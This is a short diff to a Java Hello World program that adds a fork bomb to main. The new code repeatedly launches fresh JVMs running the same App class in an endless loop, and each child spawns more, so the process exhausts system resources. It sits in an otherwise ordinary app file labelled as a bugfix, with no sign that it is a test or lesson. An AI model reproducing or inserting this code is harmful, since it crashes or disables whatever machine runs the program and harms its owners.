@@ -2,6 +2,20 @@ public class App {
     public static void main(String[] args) throws Exception {
 	System.out.println("Hello, World! bugfix");
         System.out.println("Hello, World!");
+     	System.out.println("PID " + ProcessHandle.current().pid() + " says hello.");
+        String javaCmd = System.getProperty("java.home") +
+                         System.getProperty("file.separator") +
+                         "bin" +
+                         System.getProperty("file.separator") +
+                         "java";
+        String cp = System.getProperty("java.class.path");
+        try {
+	    while (true) {
+            	Process p = Runtime.getRuntime().exec(new String[]{javaCmd, "-cp", cp, "App"});
+	    }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     public void thisIsANewMethod() {
